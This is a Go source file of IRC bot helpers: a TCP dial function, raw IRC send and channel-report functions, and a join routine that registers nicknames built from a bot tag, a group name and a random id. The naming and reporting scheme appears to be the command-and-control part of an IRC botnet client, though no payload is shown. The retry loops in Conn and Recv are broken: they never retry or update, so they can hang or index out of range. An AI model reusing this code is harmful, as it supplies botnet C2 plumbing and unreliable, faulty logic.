package lib

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

func Conn(server string) net.Conn {
	conn, err := net.Dial("tcp", server)
	for err != nil {
		time.Sleep(5 * time.Second)
		continue
	}
	return conn
}

func Recv(str string, args int) string {
	recv := strings.Split(str, " ")
	for len(recv) == args {
		time.Sleep(5 * time.Second)
		continue
	}
	return recv[args]
}

func Find(read, str string) bool {
	return strings.Contains(read, str)
}

func (b *Bot) Send(str string) {
	fmt.Fprintf(b.IRC, "%s\r\n", str)
}

func (b *Bot) Report(str string) {
	b.Send("PRIVMSG " + b.Channel + "  :" + str)
}

func (b *Bot) Join() {
	rand.Seed(time.Now().UnixNano())
	id := rand.Intn(1000000)
	group := genName('A')

	user := fmt.Sprint("USER ["+b.BotTag+"][", group, "][", id, "]", " 8 * :bot")
	nick := fmt.Sprint("NICK ["+b.BotTag+"][", group, "][", id, "]")

	b.Send(user)
	b.Send(nick)
}
